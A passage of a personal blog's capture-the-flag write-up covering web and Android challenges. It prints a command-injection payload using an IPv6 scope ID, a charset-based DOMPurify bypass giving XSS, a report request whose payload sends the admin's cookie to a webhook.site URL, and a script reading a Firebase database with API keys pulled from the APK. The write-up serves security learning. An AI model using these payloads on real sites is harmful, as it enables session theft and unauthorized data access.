class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5004</span>)</span><br></pre></td></tr></table></figure>

<p>At first glance, it looks like the website is vulnerable to <code>command injection</code> due to this part of code. It directly uses the <code>IP</code> parameter and append it at the end of the command <code>ping -c 2 &#123;IP here&#125;</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ping</span>():</span><br><span class="line">    user_supplied_IP = request.args.get(<span class="string">&#x27;IP&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        myIPaddress = ipaddress.ip_address(user_supplied_IP)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        custom_error_msg = <span class="string">&#x27;You supplied an invalid IP address&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=custom_error_msg)</span><br><span class="line"></span><br><span class="line">    command_to_execute = <span class="string">f&#x27;ping -c 2 <span class="subst">&#123;myIPaddress&#125;</span>&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(command_to_execute, flush=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>Technically, if I try to send in input like <code>127.0.0.1; whoami</code>. It should execute the first command which is to ping <code>127.0.0.1</code> and then proceed with the second command <code>whoami</code> right..? Welp it doesn’t work at all, I keep on getting <code>You supplied an invalid IP address</code>.</p>
<p>This is because of the <code>ipaddress.ipaddress()</code> function finds out that all of the <code>IPv4 Address</code> that we are trying to ping looks funny, in returns, gives us the <code>ValueError</code> output.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myIPaddress = ipaddress.ip_address(user_supplied_IP)</span><br></pre></td></tr></table></figure>

<p><img src="/./Website/image4.png"></p>
<p>I myself not a fan of reading <a target="_blank" rel="noopener" href="https://docs.python.org/3/library/ipaddress.html">docs</a>, but decided to read it again and luckily this time found something suspicious.</p>
<blockquote>
<p>Optionally, the string may also have a scope zone ID, expressed with a suffix %scope_id. If present, the scope ID must be non-empty, and may not contain %. See RFC 4007 for details. For example, fe80::1234%1 might identify address fe80::1234 on the first link of the node.</p>
</blockquote>
<p>Therefore, I try to use IPv6 address together with a scope zone ID something like this request <code>2001:db8::1%1; ls</code> (without knowing the functionality of it ofc) and somehow it accepts the input together with the command injection payload :))</p>
<p><img src="/./Website/image5.png"></p>
<h2 id="Impossible-XSS"><a href="#Impossible-XSS" class="headerlink" title="Impossible XSS"></a>Impossible XSS</h2><h3 id="Analysis-6"><a href="#Analysis-6" class="headerlink" title="Analysis"></a>Analysis</h3><p>Looking at the tree structure of the website, I noticed that there is <code>bot.js</code>, and inside it there is a <code>puppeteer</code> library included, therefore there is a high chance that this challenge is related to <code>XSS</code>.</p>
<p><code>Puppeteer</code> is a headless browser automation tool that can simulate real browser interactions. In CTF challenges, it is commonly used to simulate an <code>admin bot</code>.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── docker-compose.yml</span><br><span class="line">├── Dockerfile</span><br><span class="line">└── app</span><br><span class="line">   ├── app.js</span><br><span class="line">   ├── bot.js</span><br><span class="line">   └── package.json</span><br><span class="line"></span><br><span class="line">3 directories, 10 files</span><br></pre></td></tr></table></figure>

<p>This website has 2 endpoints that we can visit</p>
<ol>
<li><code>/</code></li>
<li><code>/report</code></li>
</ol>
<p>At <code>/</code> endpoint which is most likely where the <code>XSS</code> vulnerability occur because there are no other place where we can <code>reflect</code> our input.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fastify.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">request, reply</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> userInput = request.<span class="property">query</span>.<span class="property">input</span> || <span class="string">&quot;Enter your input in /?input=here&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="variable language_">window</span> = <span class="keyword">new</span> <span class="title function_">JSDOM</span>(<span class="string">&quot;&quot;</span>).<span class="property">window</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">DOMPurify</span> = <span class="title function_">createDOMPurify</span>(<span class="variable language_">window</span>);</span><br><span class="line">  <span class="keyword">const</span> clean = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(userInput);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(clean);</span><br><span class="line"></span><br><span class="line">  reply.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">header</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(clean);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>I actually got stuck here for a couple of days because I can’t find any payload that can somehow pop an <code>alert</code> here because of the <code>DOMPurify sanitization</code> function.</p>
<p>Then I start to google information that is related to <code>DOMPurify bypass</code> and turns out that the only way for me to pop an alert is by finding <code>0 day</code> for that specific library 💀.</p>
<h4 id="DOMPurify-Misconfig"><a href="#DOMPurify-Misconfig" class="headerlink" title="DOMPurify Misconfig"></a>DOMPurify Misconfig</h4><p>I find that really impossible so I start digging for more information and come across <a target="_blank" rel="noopener" href="https://new-blog.ch4n3.kr/bypassing-dompurify-possibilities/">this article by Seokchan Yoon</a>.</p>
<p>Turns out there is actually a possibility to bypass <code>DOMPurify</code> <em>ONLY IF</em> the developer misused&#x2F;misconfigured the function.</p>
<p>But again if you take a look at the source code, it is way too simple that you couldn’t even find out what is misconfigured :T</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable language_">window</span> = <span class="keyword">new</span> <span class="title function_">JSDOM</span>(<span class="string">&quot;&quot;</span>).<span class="property">window</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">DOMPurify</span> = <span class="title function_">createDOMPurify</span>(<span class="variable language_">window</span>);</span><br><span class="line"><span class="keyword">const</span> clean = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(userInput);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(clean);</span><br><span class="line"></span><br><span class="line">reply.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">header</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(clean);</span><br></pre></td></tr></table></figure>

<p>So I started asking for hint:-</p>
<ol>
<li>Is it related to mXSS?</li>
</ol>
<p><img src="/./Website/image7.png"></p>
<ol start="2">
<li>Which then lead to another hint :)</li>
</ol>
<p><img src="/./Website/image8.png"></p>
<h4 id="Content-Type-Header-Exploit"><a href="#Content-Type-Header-Exploit" class="headerlink" title="Content Type Header Exploit"></a>Content Type Header Exploit</h4><p>If you take a look at this code snippet right here, the <code>Content-Type</code> is actually missing something, which is <code>charset</code> initialization.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reply.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">header</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(clean);</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /?input=<span class="built_in">test</span> HTTP/1.1</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">content-type: text/html</span><br></pre></td></tr></table></figure>

<p>Usually it is set to <code>UTF-8</code>, but lucky for us here the developer forgot to set it, therefore we can use any type of <code>encoding</code> we want to break the <code>HTML</code> context.</p>
<p>We can try to replicate this brilliant example here by <a target="_blank" rel="noopener" href="https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/#technique-2-breaking-html-context">Stefan Schiller</a>.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?input=&lt;img alt=<span class="string">&quot;test1&quot;</span>&gt;&lt;img alt=<span class="string">&quot;test2&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/./Website/image9.png"></p>
<p>So technically our payload here isn’t breaking any rules of <code>DOMPurify</code> so it will not sanitize anything.</p>
<p>To change the charset from <code>ASCII / ISO-2022-JP</code> (on default) to something else like <code>JIS X 0208 1978</code> we need to use the <code>escape sequence</code> which is url encoded like-so <code>%1B</code>, following with a specific value <code>$@</code> to make the browser ‘sniff’ and decode all bytes with <code>JIS X 0208 1978</code>. So combine both of them it will be like this <code>%1B$@</code>.</p>
<p>Now what we can do here is insert the <code>escape sequence</code> inside the <code>alt</code> attribute value just to see if it managed to break the <code>HTML context</code>.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?input=&lt;img alt=<span class="string">&quot;%1B<span class="variable">$@</span>&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>As you can see here it definitely did, even the <code>DOMPurify</code> can’t sanitize this payload, by right it should’ve enclosed the <code>img</code> tag like so <code>&lt;img alt=&quot;%1B$@&quot;&gt;</code>. However, the escape sequence value ends up consuming both the <code>closing double quote</code> and the <code>closing angle bracket</code>.</p>
<p><img src="/./Website/image11.png"></p>
<p>We are getting close, so now we need to change the charset from <code>JIS X 0208 1978</code> back to <code>ASCII / ISO-2022-JP</code> using this <code>escape sequence</code>, <code>%1B</code> followed with this value <code>(B</code>, to enable us to inject the rest of the <code>ASCII</code> payload in this case we will be using <code>onerror</code> attribute to pop an <code>alert</code>.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?input=&lt;img alt=<span class="string">&quot;%1B<span class="variable">$@</span>&quot;</span>&gt;%1B(B&lt;img alt=<span class="string">&quot; src=x onerror=alert(&#x27;yo&#x27;)//&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>Let me explain the second part of the payload <code>%1B(B&lt;img alt=&quot; src=x onerror=alert(&#39;yo&#39;)//&quot;&gt;</code></p>
<ol>
<li><code>%1B(B</code> - to ‘sniff’ the browser back to <code>ASCII / ISO-2022-JP</code></li>
<li><code>alt=&quot;</code> - why alt with one tag? because to <code>enclose</code> the <code>consumed double quotes</code> from the previous <code>escape sequence</code> trick</li>
<li><code>src=x</code> - intentionally fires the <code>onerror</code> attribute after since x is <code>invalid</code> url&#x2F;image</li>
<li><code>onerror=alert(&#39;yo&#39;)</code> - pop an alert box :)</li>
<li><code>//</code> - is used to comment out the rest of the payload because, the first image tag is not closed</li>
<li><code>&quot;</code> - is used to close the second image <code>alt</code> attribute values</li>
<li><code>&gt;</code> - to close the rest of second <code>img</code> tag</li>
</ol>
<p>Finally, it works!</p>
<p><img src="/./Website/image12.png"></p>
<h4 id="Solve-Script-3"><a href="#Solve-Script-3" class="headerlink" title="Solve Script"></a>Solve Script</h4><p>Now steal the cookie from admin by reporting the payload to <code>/report</code> endpoint by using <code>webhook</code>.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /report HTTP/1.1</span><br><span class="line">Host: localhost:7888</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 236</span><br><span class="line">Cookie: PHPSESSID=7rp218t2ljq7ni76inbto66cv1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">url=%3Cimg+alt%3D%22%251B%24%40%22%3E%251B%28B+%3Cimg+alt%3D%22src%3Dx+onerror%3D%27fetch%28%60https%3A%2F%2Fwebhook.site%2F030e0794-2b99-41c3-96e6-b920e2f5634c%3Fc%3D%24%7BencodeURIComponent%28document.cookie%29%7D%60%29%27%2F%2F%22%3E</span><br></pre></td></tr></table></figure>

<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><ol>
<li><a target="_blank" rel="noopener" href="https://new-blog.ch4n3.kr/bypassing-dompurify-possibilities">https://new-blog.ch4n3.kr/bypassing-dompurify-possibilities</a></li>
<li><a target="_blank" rel="noopener" href="https://x.com/kevin_mizu/status/1733086824518787473">https://x.com/kevin_mizu/status/1733086824518787473</a></li>
<li><a target="_blank" rel="noopener" href="https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/#technique-2-breaking-html-context">https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/#technique-2-breaking-html-context</a></li>
<li><a target="_blank" rel="noopener" href="https://x.com/terjanq/status/1876654801397911931">https://x.com/terjanq/status/1876654801397911931</a></li>
</ol>
<h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="Who’s-that-Pukimon"><a href="#Who’s-that-Pukimon" class="headerlink" title="Who’s that Pukimon"></a>Who’s that Pukimon</h2><p>First off, try to get the source code of the apk by either <code>unzipping</code> normally or you can use <code>MobSF Framework</code>.</p>
<p>Analyzing the source codes, there are 7 potential activities files</p>
<ol>
<li><strong><em>io.eqctf.pukimon.MainActivity</em></strong></li>
<li>com.google.firebase.auth.internal.GenericIdpActivity</li>
<li>com.google.firebase.auth.internal.RecaptchaActivity</li>
<li>androidx.credentials.playservices.HiddenActivity</li>
<li>com.google.android.gms.auth.api.signin.internal.SignInHubActivity</li>
<li>com.google.android.gms.common.api.GoogleApiActivity</li>
<li>com.google.android.play.core.common.PlayCoreDialogWrapperActivity</li>
</ol>
<p>By looking at the names <code>io.eqctf.pukimon.MainActivity</code> is definitely the MainActivity file and apart from that <code>com.google.firebase.auth.internal.GenericIdpActivity</code> and <code>com.google.firebase.auth.internal.RecaptchaActivity</code> gives us a clear view that this apk is using <code>Firebase</code> as its database.</p>
<h3 id="Content-of-MainActivityKt-java"><a href="#Content-of-MainActivityKt-java" class="headerlink" title="Content of MainActivityKt.java"></a>Content of MainActivityKt.java</h3><p>So this file can be found inside <code>io.eqctf.pukimon.MainActivity</code>, I prompted it to gpt cuz I’m bad at reading code.</p>
<p>This function here checks if our input converted to hex matches the value <code>5368726f6f6d6973686965</code>.</p>
<blockquote>
<p>Convert Hex to ASCII<br>5368726f6f6d6973686965 &#x3D;&#x3D; Shroomishie</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">a</span><span class="params">(String str)</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] bytes = str.getBytes(Charsets.UTF_8);</span><br><span class="line">    <span class="keyword">if</span> (Intrinsics.areEqual(ArraysKt.joinToString$<span class="keyword">default</span>(bytes, <span class="string">&quot;&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="number">0</span>, <span class="literal">null</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Function1</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">invoke</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> MainActivityKt.a$lambda$<span class="number">3</span>(((Byte) obj).byteValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="number">30</span>, <span class="literal">null</span>), <span class="string">&quot;5368726f6f6d6973686965&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>When correctly guessed, it logs the flag, you can retrieve the value either by reading the <code>source code</code> or by using <code>adb logcat</code> command.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] decode = Base64.decode(<span class="string">&quot;AEUAUQBDAFQARgB7ADEAVABzAF8AUwBoAHIAMABvAE0AcgAxAHMASABpAEUAIQAhACEAIQB9&quot;</span>, <span class="number">0</span>);</span><br><span class="line">Log.d(<span class="string">&quot;Flag&quot;</span>, <span class="string">&quot;Congratz on guessing the pokemon: &quot;</span>.concat(<span class="keyword">new</span> <span class="title class_">String</span>(decode, Charsets.UTF_8)));</span><br></pre></td></tr></table></figure>

<h2 id="Capture-that-Pukimon"><a href="#Capture-that-Pukimon" class="headerlink" title="Capture that Pukimon"></a>Capture that Pukimon</h2><p>This challenge you need to intercept the request that the mobile is making to <code>Firebase</code>. How do I know that it is making some kind of communication to <code>Firebase</code>?</p>
<p>Inside the same file if your input is correct which is <code>Shroomishie</code> it will take that input and use it as a path to fetch data from <code>Firebase</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">a</span><span class="params">(String str, <span class="keyword">final</span> Function1&lt;? <span class="built_in">super</span> String, Unit&gt; function1)</span> &#123;</span><br><span class="line">    <span class="type">DatabaseReference</span> <span class="variable">reference</span> <span class="operator">=</span> FirebaseDatabase.getInstance().getReference(str);</span><br><span class="line">    Intrinsics.checkNotNullExpressionValue(reference, <span class="string">&quot;getReference(...)&quot;</span>);</span><br><span class="line">    Task&lt;DataSnapshot&gt; task = reference.get();</span><br><span class="line">    <span class="comment">// ... event handlers for success/failure</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>So to intercept the communication just use proxy tools like <code>Burp Suite</code> or <code>HTTPToolkit</code> but you need to remember… that the traffic is using <code>websocket</code> and not <code>HTTP</code>.</p>
<p>As you can see here there is a <code>GET</code> request to <code>s-usc1f-nss-2568.firebaseio.com </code>, just take a look at the responses, the flag is in one of em.</p>
<p><img src="/./images/imageEq3.png" alt="alt text"></p>
<h2 id="Cook-that-Pukimon"><a href="#Cook-that-Pukimon" class="headerlink" title="Cook that Pukimon"></a>Cook that Pukimon</h2><p>Lastly if you use apktool to decompile the apk, you noticed that there is <code>strings.xml</code> inside <code>res/values</code>.</p>
<p>If you take a look inside it, there are a couple of <code>sensitive</code> information inside it.</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;gcm_defaultSenderId&quot;</span>&gt;</span>402409561826<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;google_api_key&quot;</span>&gt;</span>AIzaSyBKr-_5vWCd4wT0Q9W50vWtaA7meeCYcss<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;google_app_id&quot;</span>&gt;</span>1:402409561826:android:e9d44b894477f95e6f88bb<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;google_crash_reporting_api_key&quot;</span>&gt;</span>AIzaSyBKr-_5vWCd4wT0Q9W50vWtaA7meeCYcss<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;google_storage_bucket&quot;</span>&gt;</span>eqctf-pukimon1.firebasestorage.app<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Now for this part I need refer to someone else <a target="_blank" rel="noopener" href="https://medium.com/@AhmedMhesham/ascwg-ctf-2024-android-challenges-solution-source-code-8c57ffccdcd2">writeups</a> to understand how to connect to <code>Firebase</code> since I have no experience in using it. Inside the article there is a dart script that will be able to extract informations from the database.</p>
<p>Here is my own script, I prefer to use JS instead.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; initializeApp &#125; = <span class="built_in">require</span>(<span class="string">&quot;firebase/app&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; getDatabase, ref, get &#125; = <span class="built_in">require</span>(<span class="string">&quot;firebase/database&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; getAuth, signInAnonymously &#125; = <span class="built_in">require</span>(<span class="string">&quot;firebase/auth&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> firebaseConfig = &#123;</span><br><span class="line">  <span class="attr">apiKey</span>: <span class="string">&quot;AIzaSyBKr-_5vWCd4wT0Q9W50vWtaA7meeCYcss&quot;</span>,</span><br><span class="line">  <span class="attr">authDomain</span>: <span class="string">&quot;eqctf-pukimon1.firebaseapp.com&quot;</span>,</span><br><span class="line">  <span class="attr">databaseURL</span>: <span class="string">&quot;https://eqctf-pukimon1-default-rtdb.firebaseio.com&quot;</span>,</span><br><span class="line">  <span class="attr">projectId</span>: <span class="string">&quot;eqctf-pukimon1&quot;</span>,</span><br><span class="line">  <span class="attr">storageBucket</span>: <span class="string">&quot;eqctf-pukimon1.firebasestorage.app&quot;</span>,</span><br><span class="line">  <span class="attr">messagingSenderId</span>: <span class="string">&quot;402409561826&quot;</span>,</span><br><span class="line">  <span class="attr">appId</span>: <span class="string">&quot;1:402409561826:android:e9d44b894477f95e6f88bb&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">initializeApp</span>(firebaseConfig);</span><br><span class="line"><span class="keyword">const</span> database = <span class="title function_">getDatabase</span>(app);</span><br><span class="line"><span class="keyword">const</span> auth = <span class="title function_">getAuth</span>(app);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">readData</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">signInAnonymously</span>(auth);</span><br><span class="line">    <span class="keyword">const</span> dbRef = <span class="title function_">ref</span>(database);</span><br><span class="line">    <span class="keyword">const</span> snapshot = <span class="keyword">await</span> <span class="title function_">get</span>(dbRef);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (snapshot.<span class="title function_">exists</span>()) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Data from database:&quot;</span>, snapshot.<span class="title function_">val</span>());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;No data available&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error:&quot;</span>, error);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">readData</span>();</span><br></pre></td></tr></table></figure>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Megat Zafran</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://ilikeronnnnii.github.io/2025/01/20/eqctf/">https://ilikeronnnnii.github.io/2025/01/20/eqctf/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>peepo pog</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2025/03/17/pentest/">CompTIA PenTest+ (PT0-002) Review</a>
            
            
            <a class="next" rel="next" href="/2024/11/16/cyberx1/">Briefing Session Challenges</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Megat Zafran | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>